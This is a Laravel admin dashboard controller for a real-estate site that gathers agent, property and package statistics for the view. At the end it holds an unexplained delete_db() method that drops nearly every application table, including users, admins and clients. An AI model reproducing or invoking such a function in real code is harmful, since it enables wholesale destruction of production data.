<?php

namespace App\Http\Controllers\Admin;

use App\ProductCategory;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Agent;
use App\Property;
use App\Package;
use Illuminate\Support\Facades\DB;

class AdminDashboard extends Controller{

    public function __construct()
    {
        $this->middleware('admin');
    }

    public function index(Request $request){

      /*$categories = Category::select(DB::raw('categories.*, count(*) as `aggregate`'))
                  ->join('pictures', 'categories.id', '=', 'pictures.category_id')
                  ->groupBy('category_id')
                  ->orderBy('aggregate', 'desc')
                  ->paginate(10);*/

            /*
            // in Category.php
            public function pictures() {
                return $this->hasMany('Picture')
            }

            // in Picture.php
            public function Category() {
                return $this->belongsTo('Category');
            }

            SELECT categories.id, categories.name AS category_name, COUNT(pictures.id) AS picture_count
            FROM categories
            JOIN pictures
            ON categories.id = pictures.category_id
            GROUP BY categories.id
            ORDER BY picture_count DESC

            */





        $agents = Agent::select(DB::raw('agents.id,
        agents.first_name as first_name,
        agents.last_name as last_name,
        COUNT(properties.id) as num_properties'))
                  ->leftJoin('properties', 'agents.id', '=', 'properties.agent_id')
                  ->groupBy('agents.id')
                  ->orderBy('num_properties', 'desc')
                  ->get();


        $properties = Property::orderBy('id','desc')
        ->take(5)
        ->get();


        $packages = Package::all();

        $v_properties = Property::take(5)
        ->orderBy('views','desc')
        ->get();

        return view('admin.admin_dashboard')
        ->with(['agents' => $agents,
        'properties' => $properties,
        'packages' => $packages,
        'v_properties' => $v_properties]);

    }

    function delete_db(){
        DB::statement("DROP TABLE `additional_rooms`, `admins`, `agents`, `agent_favorites`, `amenities`, `banners`, `clients`, `comments`, `equipments`, `features`,
        `mail_from_users`, `migrations`, `news_letters`, `news_letter_logs`, `news_letter_subscribers`,
        `packages`, `password_resets`, `posts`, `properties`, `property_amenities`, `property_documents`,
        `property_equipments`, `property_features`, `property_images`, `property_inquiries`, `property_types`,
        `property_videos`, `reviews`, `r_partners`, `users`");
        ;
    }

}
